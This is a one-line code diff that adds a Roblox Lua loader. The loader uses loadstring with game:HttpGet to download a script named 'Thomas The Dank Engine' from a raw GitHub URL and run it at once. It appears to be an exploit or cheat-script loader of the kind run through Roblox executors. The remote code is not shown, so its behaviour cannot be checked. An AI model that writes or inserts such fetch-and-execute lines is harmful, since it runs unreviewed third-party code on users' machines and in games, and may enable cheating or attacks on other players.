@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Thomas%20The%20Dank%20Engine.txt"))()
